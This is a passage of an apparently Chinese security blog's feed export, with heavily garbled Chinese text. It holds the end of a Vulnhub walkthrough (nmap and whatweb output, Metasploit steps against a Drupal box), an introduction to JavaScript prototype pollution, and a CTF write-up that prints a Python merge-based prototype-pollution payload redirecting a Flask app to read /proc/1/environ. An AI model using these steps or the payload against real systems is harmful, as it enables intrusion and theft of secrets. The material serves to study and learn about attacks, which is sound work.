class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 3.2 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.43 ms 192.168.205.129</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.30 seconds</span><br></pre></td></tr></table></figure><p>å¾—åˆ°22 80 111 ä¸‰ä¸ªç«¯å£</p><p>22æ˜¯ssh 80æ˜¯httpæœåŠ¡ </p><p>é¦–å…ˆè¿›å…¥webé¡µé¢çœ‹ä¸€çœ‹æœ‰ä»€ä¹ˆ</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250216173216.png"></p><p>ä¸€ä¸ªç™»å½•é¡µé¢ æ‹¿ä¸€ä¸‹ç½‘ç«™çš„åŸºæœ¬ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]</span><br><span class="line">â””â”€# whatweb -v 192.168.205.129</span><br><span class="line">WhatWeb report for http://192.168.205.129</span><br><span class="line">Status    : 200 OK</span><br><span class="line">Title     : Welcome to Drupal Site | Drupal Site</span><br><span class="line">IP        : 192.168.205.129</span><br><span class="line">Country   : RESERVED, ZZ</span><br><span class="line"></span><br><span class="line">Summary   : Apache[2.2.22], Content-Language[en], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PasswordField[pass], PHP[5.4.45-0+deb7u14], Script[text/javascript], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]   </span><br><span class="line"></span><br><span class="line">Detected Plugins:</span><br><span class="line">[ Apache ]</span><br><span class="line">        The Apache HTTP Server Project is an effort to develop and </span><br><span class="line">        maintain an open-source HTTP server for modern operating </span><br><span class="line">        systems including UNIX and Windows NT. The goal of this </span><br><span class="line">        project is to provide a secure, efficient and extensible </span><br><span class="line">        server that provides HTTP services in sync with the current </span><br><span class="line">        HTTP standards. </span><br><span class="line"></span><br><span class="line">        Version      : 2.2.22 (from HTTP Server Header)</span><br><span class="line">        Google Dorks: (3)</span><br><span class="line">        Website     : http://httpd.apache.org/</span><br><span class="line"></span><br><span class="line">[ Content-Language ]</span><br><span class="line">        Detect the content-language setting from the HTTP header. </span><br><span class="line"></span><br><span class="line">        String       : en</span><br><span class="line"></span><br><span class="line">[ Drupal ]</span><br><span class="line">        Drupal is an opensource CMS written in PHP. </span><br><span class="line"></span><br><span class="line">        Aggressive function available (check plugin file or details).</span><br><span class="line">        Google Dorks: (1)</span><br><span class="line">        Website     : http://www.drupal.org</span><br><span class="line"></span><br><span class="line">[ HTTPServer ]</span><br><span class="line">        HTTP server header string. This plugin also attempts to </span><br><span class="line">        identify the operating system from the server header. </span><br><span class="line"></span><br><span class="line">        OS           : Debian Linux</span><br><span class="line">        String       : Apache/2.2.22 (Debian) (from server string)</span><br><span class="line"></span><br><span class="line">[ JQuery ]</span><br><span class="line">        A fast, concise, JavaScript that simplifies how to traverse </span><br><span class="line">        HTML documents, handle events, perform animations, and add </span><br><span class="line">        AJAX. </span><br><span class="line"></span><br><span class="line">        Website     : http://jquery.com/</span><br><span class="line"></span><br><span class="line">[ MetaGenerator ]</span><br><span class="line">        This plugin identifies meta generator tags and extracts its </span><br><span class="line">        value. </span><br><span class="line"></span><br><span class="line">        String       : Drupal 7 (http://drupal.org)</span><br><span class="line"></span><br><span class="line">[ PHP ]</span><br><span class="line">        PHP is a widely-used general-purpose scripting language </span><br><span class="line">        that is especially suited for Web development and can be </span><br><span class="line">        embedded into HTML. This plugin identifies PHP errors, </span><br><span class="line">        modules and versions and extracts the local file path and </span><br><span class="line">        username if present. </span><br><span class="line"></span><br><span class="line">        Version      : 5.4.45-0+deb7u14</span><br><span class="line">        Google Dorks: (2)</span><br><span class="line">        Website     : http://www.php.net/</span><br><span class="line"></span><br><span class="line">[ PasswordField ]</span><br><span class="line">        find password fields </span><br><span class="line"></span><br><span class="line">        String       : pass (from field name)</span><br><span class="line"></span><br><span class="line">[ Script ]</span><br><span class="line">        This plugin detects instances of script HTML elements and </span><br><span class="line">        returns the script language/type. </span><br><span class="line"></span><br><span class="line">        String       : text/javascript</span><br><span class="line"></span><br><span class="line">[ UncommonHeaders ]</span><br><span class="line">        Uncommon HTTP server headers. The blacklist includes all </span><br><span class="line">        the standard headers and many non standard but common ones. </span><br><span class="line">        Interesting but fairly common headers should have their own </span><br><span class="line">        plugins, eg. x-powered-by, server and x-aspnet-version. </span><br><span class="line">        Info about headers can be found at www.http-stats.com </span><br><span class="line"></span><br><span class="line">        String       : x-generator (from headers)</span><br><span class="line"></span><br><span class="line">[ X-Powered-By ]</span><br><span class="line">        X-Powered-By HTTP header </span><br><span class="line"></span><br><span class="line">        String       : PHP/5.4.45-0+deb7u14 (from x-powered-by string)</span><br><span class="line"></span><br><span class="line">HTTP Headers:</span><br><span class="line">        HTTP/1.1 200 OK</span><br><span class="line">        Date: Sat, 15 Feb 2025 23:03:39 GMT</span><br><span class="line">        Server: Apache/2.2.22 (Debian)</span><br><span class="line">        X-Powered-By: PHP/5.4.45-0+deb7u14</span><br><span class="line">        Expires: Sun, 19 Nov 1978 05:00:00 GMT</span><br><span class="line">        Last-Modified: Sat, 15 Feb 2025 23:03:39 +0000</span><br><span class="line">        Cache-Control: no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line">        ETag: &quot;1739660619&quot;</span><br><span class="line">        Content-Language: en</span><br><span class="line">        X-Generator: Drupal 7 (http://drupal.org)</span><br><span class="line">        Vary: Accept-Encoding</span><br><span class="line">        Content-Encoding: gzip</span><br><span class="line">        Content-Length: 2276</span><br><span class="line">        Connection: close</span><br><span class="line">        Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°é¶æœºçš„cmsæ˜¯Drupal</p><p>***å¯åŠ¨Metersploit*****<em><strong>æœåŠ¡*</strong></em></p><p>æœå¯»drupalæ¨¡å—</p><p>ä½¿ç”¨åºå·ä¸€è¿™ä¸ª</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use 1</span><br><span class="line"></span><br><span class="line">set Rhost 192.168.29.131 *# sè®¾ç½®é¶æœºip*</span><br><span class="line"></span><br><span class="line">set lhost 192.168.29.128 *# è®¾ç½®æ”»æœºip*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">run#</span><span class="language-bash">å¼€å§‹æ”»å‡»</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jsåŸå‹é“¾æ±¡æŸ“åˆæ¢</title>
      <link href="/2024/11/25/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%9D%E6%8E%A2/"/>
      <url>/2024/11/25/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<p>Learn from:<a href="https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html">https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html</a></p><p>å…ˆæ”¾ä¸€å¼ å›¾</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1732502203084.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">js æ˜¯ç”±å¯¹è±¡ç»„æˆçš„ï¼Œå¯¹è±¡ä¸å¯¹è±¡ä¹‹é—´å­˜åœ¨ç€ç»§æ‰¿å…³ç³»</span><br><span class="line"></span><br><span class="line">æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªæŒ‡å‘å®ƒçš„åŸå‹çš„å†…éƒ¨é“¾æ¥ï¼Œè€Œè¿™ä¸ªåŸå‹å¯¹è±¡åˆæœ‰ä»–è‡ªå·±çš„åŸå‹ï¼Œç›´åˆ° null ä¸ºæ­¢</span><br><span class="line"></span><br><span class="line">æ•´ä½“çœ‹æ¥å°±æ˜¯å¤šä¸ªå¯¹è±¡å±‚å±‚ç»§æ‰¿ï¼Œå®ä¾‹å¯¹è±¡çš„åŸå‹é“¾æ¥å½¢æˆäº†ä¸€æ¡é“¾ï¼Œä¹Ÿå°±æ˜¯ js çš„åŸå‹é“¾</span><br><span class="line"></span><br><span class="line">åœ¨ js ä¸­æ¯ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ª prototype å±æ€§ï¼Œè€Œæ¯ä¸ªå¯¹è±¡ä¸­ä¹Ÿæœ‰ä¸€ä¸ª **proto** å±æ€§ç”¨æ¥æŒ‡å‘å®ä¾‹å¯¹è±¡çš„åŸå‹</span><br><span class="line"></span><br><span class="line">è€Œæ¯ä¸ªåŸå‹ä¹Ÿéƒ½æœ‰ä¸€ä¸ª constructor å±æ€§æ‰§è¡Œç›¸å…³è”çš„æ„é€ å‡½æ•°ï¼Œæˆ‘ä»¬å°±æ˜¯é€šè¿‡æ„é€ å‡½æ•°ç”Ÿæˆå®ä¾‹åŒ–çš„å¯¹è±¡</span><br></pre></td></tr></table></figure><p>ç”±äºå¯¹è±¡ä¹‹é—´å­˜åœ¨ç»§æ‰¿å…³ç³»ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬è¦ä½¿ç”¨æˆ–è€…è¾“å‡ºä¸€ä¸ªå˜é‡å°±ä¼šé€šè¿‡åŸå‹é“¾å‘ä¸Šæœç´¢ï¼Œå½“ä¸Šå±‚æ²¡æœ‰å°±ä¼šå†å‘ä¸Šä¸Šå±‚æœç´¢ï¼Œç›´åˆ°æŒ‡å‘ nullï¼Œè‹¥æ­¤æ—¶è¿˜æœªæ‰¾åˆ°å°±ä¼šè¿”å› undefined</p><p>è¿™å¹…å›¾çš„åŸå‹é“¾æ˜¯ </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat-&gt;Cat.protype-&gt;Object.prototype-&gt;null</span><br></pre></td></tr></table></figure><p><strong>åŸå‹é“¾æ±¡æŸ“é€šå¸¸å‡ºç°åœ¨å¯¹è±¡</strong>ï¼Œ<strong>æ•°ç»„çš„é”®åæˆ–è€…å±æ€§åå¯æ§</strong>ï¼ŒåŒæ—¶æ˜¯èµ‹å€¼è¯­å¥çš„æƒ…å†µä¸‹ ( é€šå¸¸ä½¿ç”¨ json ä¼ å€¼ )</p><p>Learn form:<a href="https://pazuris.cn/2023/07/26/NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://pazuris.cn/2023/07/26/NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></p><p>å¸ˆå‚…è®²çš„å¾ˆè¯¦ç»†</p><p><strong>prototypeå’Œ__proto__çš„åŒºåˆ«</strong></p><p>åœ¨ JavaScript ä¸­ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ª <code>__proto__</code> å±æ€§ï¼Œå®ƒæŒ‡å‘è¯¥å¯¹è±¡çš„åŸå‹ã€‚åŸå‹æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä¹Ÿå¯ä»¥æœ‰è‡ªå·±çš„åŸå‹ï¼Œè¿™æ ·å°±å½¢æˆäº†ä¸€ä¸ªåŸå‹é“¾ã€‚åŒæ—¶ï¼Œæ¯ä¸ªå‡½æ•°ä¹Ÿæœ‰ä¸€ä¸ª <code>prototype</code> å±æ€§ï¼Œå®ƒæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå½“è¯¥å‡½æ•°ä½œä¸ºæ„é€ å‡½æ•°åˆ›å»ºå®ä¾‹æ—¶ï¼Œå®ä¾‹å¯¹è±¡çš„ <code>__proto__</code> å±æ€§ä¼šæŒ‡å‘è¯¥æ„é€ å‡½æ•°çš„ <code>prototype</code> å±æ€§ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°å±æ€§å’Œæ–¹æ³•çš„ç»§æ‰¿ã€‚</p><p>åŒºåˆ«åœ¨äºï¼š</p><ul><li><code>prototype</code>å±æ€§æ˜¯å‡½æ•°æ‰€ç‹¬æœ‰çš„ï¼Œè€Œ<code>__proro__</code>å±æ€§æ˜¯æ¯ä¸ªå¯¹è±¡éƒ½æœ‰çš„ï¼ˆå†å¼ºè°ƒä¸€æ¬¡ï¼Œå‡½æ•°ä¹Ÿæ˜¯jså¯¹è±¡ï¼‰</li><li><code>prototype</code> å±æ€§æŒ‡å‘ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒæ˜¯ç”¨æ¥å­˜å‚¨å±æ€§å’Œæ–¹æ³•ï¼Œè¿™äº›å±æ€§å’Œæ–¹æ³•å¯ä»¥è¢«è¯¥å‡½æ•°çš„å®ä¾‹å¯¹è±¡æ‰€ç»§æ‰¿ã€‚è€Œ <code>__proto__</code> å±æ€§æŒ‡å‘è¯¥å¯¹è±¡çš„åŸå‹ï¼Œå®ƒæ˜¯ç”¨æ¥å®ç°å¯¹è±¡ä¹‹é—´çš„ç»§æ‰¿ã€‚ç®€å•æ¥è¯´å°±æ˜¯<code>functionName.prototype===varName.__proto__</code>ï¼Œéƒ½å¯ä»¥è®¿é—®åˆ°å¯¹è±¡çš„åŸå‹ã€‚</li></ul><h2 id="nodejsåŸå‹é“¾æ±¡æŸ“"><a href="#nodejsåŸå‹é“¾æ±¡æŸ“" class="headerlink" title="nodejsåŸå‹é“¾æ±¡æŸ“"></a>nodejsåŸå‹é“¾æ±¡æŸ“</h2><p><strong>æ¦‚å¿µ</strong></p><p>ä¸€å¥è¯æ¦‚æ‹¬åŸå‹é“¾æ±¡æŸ“ï¼šå¦‚æœä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆä¼šå½±å“æ‰€æœ‰æ¥è‡ªäºè¿™ä¸ªåŸå‹çš„å¯¹è±¡ï¼Œè¿™å°±æ˜¯åŸå‹é“¾æ±¡æŸ“ã€‚</p><p>åŸå‹é“¾æ±¡æŸ“é€šå¸¸å‡ºç°åœ¨å¯¹è±¡ï¼Œæ•°ç»„çš„é”®åæˆ–è€…å±æ€§åå¯æ§ï¼ŒåŒæ—¶æ˜¯èµ‹å€¼è¯­å¥çš„æƒ…å†µä¸‹ ï¼ˆç®€å•æ¥è¯´å°±æ˜¯é”®åå’Œé”®å€¼éƒ½å¯æ§æƒ…å†µä¸‹ï¼‰ï¼Œå°†é”®åè®¾ç½®ä¸º<code>__proto__</code>å°±å¯ä»¥åˆ©ç”¨èµ‹å€¼è¯­å¥ä¿®æ”¹åŸå‹å¯¹è±¡ï¼Œè¿›è€Œå®ç°åŸå‹é“¾æ±¡æŸ“ï¼Œå¸¸è§çš„å±é™©å‡½æ•°æœ‰mergeå’Œcloneã€‚</p>]]></content>
      
      
      <categories>
          
          <category> pollute </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PythonåŸå‹é“¾æ±¡æŸ“</title>
      <link href="/2024/11/22/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2024/11/22/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<p>leran from :<a href="https://pazuris.cn/2023/07/27/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://pazuris.cn/2023/07/27/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></p><h1 id="PythonåŸå‹é“¾æ±¡æŸ“"><a href="#PythonåŸå‹é“¾æ±¡æŸ“" class="headerlink" title="PythonåŸå‹é“¾æ±¡æŸ“"></a>PythonåŸå‹é“¾æ±¡æŸ“</h1><p>è¿™ä¸ªçŸ¥è¯†ç‚¹åº”ç”¨çš„èŒƒå›´æ¯”è¾ƒå°ï¼Œä»…å½“é¢˜ç›®ä¸­å‡ºç°<code>utils</code>çš„<code>merge</code>æˆ–<code>Pydash</code>æ¨¡å—ä¸­çš„<code>set</code>å’Œ<code>set_with</code>å‡½æ•°æ‰ä¼šç”¨ä¸Š</p><p>é¦–å…ˆç»å…¸å›é¡¾ä¸€ä¸‹pythonçš„ç±»ä¸ç»§æ‰¿ï¼š</p><ul><li>åœ¨Pythonä¸­ï¼Œå®šä¹‰ç±»æ˜¯é€šè¿‡<code>class</code>å…³é”®å­—ï¼Œ<code>class</code>åé¢ç´§æ¥ç€æ˜¯ç±»åï¼Œç´§æ¥ç€æ˜¯<code>(object)</code>ï¼Œè¡¨ç¤ºè¯¥ç±»æ˜¯ä»å“ªä¸ªç±»ç»§æ‰¿ä¸‹æ¥çš„ï¼Œæ‰€æœ‰ç±»çš„æœ¬æºéƒ½æ˜¯objectç±»</li><li>å¯ä»¥è‡ªç”±åœ°ç»™ä¸€ä¸ªå®ä¾‹å˜é‡ç»‘å®šå±æ€§ï¼Œåƒjs</li><li>ç”±äºç±»å¯ä»¥èµ·åˆ°æ¨¡æ¿çš„ä½œç”¨ï¼Œå› æ­¤ï¼Œå¯ä»¥åœ¨åˆ›å»ºå®ä¾‹çš„æ—¶å€™ï¼ŒæŠŠä¸€äº›æˆ‘ä»¬è®¤ä¸ºå¿…é¡»ç»‘å®šçš„å±æ€§å¼ºåˆ¶å¡«å†™è¿›å»ã€‚é€šè¿‡å®šä¹‰ä¸€ä¸ªç‰¹æ®Šçš„<code>__init__</code>æ–¹æ³•ï¼Œåœ¨åˆ›å»ºå®ä¾‹çš„æ—¶å€™ï¼Œå°±æŠŠç±»å†…ç½®çš„å±æ€§ç»‘ä¸Š</li><li>æ³¨æ„åˆ°<code>__init__</code>æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ°¸è¿œæ˜¯<code>self</code>ï¼Œè¡¨ç¤ºåˆ›å»ºçš„å®ä¾‹æœ¬èº«ï¼Œå› æ­¤ï¼Œåœ¨<code>__init__</code>æ–¹æ³•å†…éƒ¨ï¼Œå°±å¯ä»¥æŠŠå„ç§å±æ€§ç»‘å®šåˆ°<code>self</code>ï¼Œå› ä¸º<code>self</code>å°±æŒ‡å‘åˆ›å»ºçš„å®ä¾‹æœ¬èº«ã€‚</li><li>å½“æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªç±»å±æ€§åï¼Œè¿™ä¸ªå±æ€§è™½ç„¶å½’ç±»æ‰€æœ‰ï¼Œä½†ç±»çš„æ‰€æœ‰å®ä¾‹éƒ½å¯ä»¥è®¿é—®åˆ°</li><li>åˆ¤æ–­ä¸€ä¸ªå˜é‡æ˜¯å¦æ˜¯æŸä¸ªç±»å‹å¯ä»¥ç”¨<code>isinstance()</code>åˆ¤æ–­ã€‚</li></ul><p>åœ¨Pythonä¸­æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªåŸå‹ï¼ŒåŸå‹ä¸Šå®šä¹‰äº†å¯¹è±¡å¯ä»¥è®¿é—®çš„å±æ€§å’Œæ–¹æ³•ã€‚å½“å¯¹è±¡è®¿é—®å±æ€§æˆ–æ–¹æ³•æ—¶ï¼Œä¼šå…ˆåœ¨è‡ªèº«æŸ¥æ‰¾ï¼Œå¦‚æœæ‰¾ä¸åˆ°å°±ä¼šå»åŸå‹é“¾ä¸Šçš„ä¸Šçº§å¯¹è±¡ä¸­æŸ¥æ‰¾ï¼ŒåŸå‹é“¾æ±¡æŸ“æ”»å‡»çš„æ€è·¯æ˜¯é€šè¿‡ä¿®æ”¹å¯¹è±¡åŸå‹é“¾ä¸­çš„å±æ€§ï¼Œä½¿å¾—ç¨‹åºåœ¨è®¿é—®å±æ€§æˆ–æ–¹æ³•æ—¶å¾—åˆ°ä¸ç¬¦åˆé¢„æœŸçš„ç»“æœã€‚</p><h2 id="DASCTF-2023-0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›-EzFlask"><a href="#DASCTF-2023-0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›-EzFlask" class="headerlink" title="[DASCTF 2023 &amp; 0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›]EzFlask"></a>[DASCTF 2023 &amp; 0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›]EzFlask</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)<span class="comment">#ç”¨äºåˆ›å»ºä¸€ä¸ª Flask åº”ç”¨å®ä¾‹</span></span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())<span class="comment">#è®¾ç½® Flask åº”ç”¨çš„å¯†é’¥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment">#éå† srcï¼Œé€’å½’åˆå¹¶æ•°æ®åˆ° dstï¼Œæ”¯æŒå­—å…¸åˆå¹¶å’Œå¯¹è±¡å±æ€§åŠ¨æ€æ›´æ–°ã€‚</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> <span class="variable language_">self</span>.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="comment">#@app.route æ˜¯ä¸€ä¸ªè£…é¥°å™¨</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:<span class="comment">#æ£€æŸ¥è¯·æ±‚ä¸­æ˜¯å¦æœ‰æ•°æ®</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#ä½¿ç”¨ try...except æ•è·æ‰€æœ‰å¯èƒ½çš„å¼‚å¸¸ï¼Œç¡®ä¿ç¨‹åºä¸ä¼šå› ä¸ºæ„å¤–é”™è¯¯è€Œå´©æºƒ</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):<span class="comment">#å‡å®šæ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çš„å‡½æ•°ï¼Œç”¨äºéªŒè¯è¯·æ±‚æ•°æ®çš„åˆæ³•æ€§</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)<span class="comment">#å°†è¯·æ±‚ä¸­çš„åŸå§‹æ•°æ®ï¼ˆå­—èŠ‚æµï¼‰è§£æä¸º Python å­—å…¸,å¦‚æœè§£æå¤±è´¥,è¿”å› &quot;Register Failed&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)<span class="comment">#å°† data ä¸­çš„é”®å€¼å¯¹åˆå¹¶åˆ°ç”¨æˆ·å®ä¾‹ User ä¸­</span></span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°mergeå‡½æ•°åŸºæœ¬æƒ³åˆ°çš„å°±æ˜¯pythonåŸå‹é“¾æ±¡æŸ“</p><p>åˆ©ç”¨mergeæ¥åŠ¨æ€æ±¡æŸ“åŸå‹é“¾çš„å€¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;username&quot;:&quot;111&quot;,</span><br><span class="line">    &quot;password&quot;:&quot;222&quot;,</span><br><span class="line">    &quot;__class__&quot;:&#123;</span><br><span class="line">        &quot;check&quot;:&#123;</span><br><span class="line">            &quot;__globals__&quot;:&#123;</span><br><span class="line">                &quot;__file__&quot; : &quot;/proc/1/environ&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åç›´æ¥get &#x2F;å°±å¥½</p><p>è±¡å¾æ€§çš„å¤ç°ä¸€ä¸‹(â—â€™â—¡â€™â—)</p>]]></content>
      
      
      <categories>
          
          <category> pollute </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pickleååºåˆ—åŒ–</title>
